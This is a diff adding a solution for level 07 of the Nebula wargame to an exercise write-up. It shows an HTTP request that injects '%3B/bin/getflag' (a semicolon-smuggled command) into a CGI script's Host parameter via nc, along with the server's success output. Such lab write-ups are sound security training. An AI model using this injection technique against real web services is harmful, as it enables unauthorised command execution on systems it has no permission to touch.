@@ -5,6 +5,27 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 07
+--------
+
+##### inspect cgi script and use http get request to exploit 'Host' argument
+```bash
+# 1. inspect /home/flag07/thttpd.conf to get server port (7007)
+# 2. man ascii shows that ';' hexa code is '0x3B'
+# 3. inject getflag call
+level07@nebula:~$ echo -e "GET http://nebula:7007/index.cgi?Host=%3B/bin/getflag HTTP/1.1\n\n" \
+                  | nc -v nebula 7007
+Connection to nebula 7007 port [tcp/afs3-bos] succeeded!
+HTTP/1.0 200 OK
+Content-type: text/html
+
+<html>
+<head><title>Ping results</title></head>
+<body><pre>You have successfully executed getflag on a target account</pre></body>
+</html>
+```
+
+
 level 08
 --------
 
